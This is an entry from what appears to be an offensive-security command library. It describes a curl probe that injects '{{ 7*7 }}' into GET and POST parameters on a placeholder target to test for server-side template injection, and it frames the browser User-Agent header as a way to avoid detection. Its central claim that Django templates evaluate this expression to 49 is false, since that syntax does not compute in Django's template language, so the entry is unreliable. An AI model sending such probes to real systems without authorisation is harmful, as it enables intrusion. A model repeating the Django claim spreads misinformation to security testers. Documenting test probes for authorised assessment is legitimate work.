---
id: 002a0a50-0a4e-4e1e-a43b-1da0223f0dce
type: command
executor: bash
data: >-
  curl -X GET "http://target.example.com/vulnerable?input={{ 7*7 }}" -H
  "User-Agent: Mozilla/5.0"
output: null
created_at: '2023-04-06T03:56:39.377118+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Web
tags:
  - ssti
  - testing
verified: true
validated: true
---

# ssti-django-simple-math-test

## Command

```bash
curl -X GET "http://target.example.com/vulnerable?input={{ 7*7 }}" -H "User-Agent: Mozilla/5.0"
```

## Description

This command tests for SSTI in a Django template by injecting a simple mathematical expression into a URL parameter. It sends an HTTP GET request to a vulnerable endpoint and checks if the server evaluates the expression.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target.example.com/vulnerable` | The URL of the vulnerable endpoint | Yes |
| `input` | The parameter name susceptible to injection | Yes |
| `{{ 7*7 }}` | The test payload (evaluates to 49 if vulnerable) | Yes |
| `-H "User-Agent: Mozilla/5.0"` | Mimics a browser to avoid detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.example.com/search?q={{ 7*7 }}" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

```bash
curl -X POST "http://target.example.com/profile" -d "name={{ 7*7 }}" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

If SSTI is present, the response body will contain '49' instead of the literal string '{{ 7*7 }}'. For example:

```
Search results for: 49
```

No evaluation indicates sanitization or non-vulnerable endpoint.

## Related

- [[procedures/Exploit-SSTI-in-Django-Templates-using-Burp-Payloads]]
- [[commands/ssti-django-burp-payload-injection]]
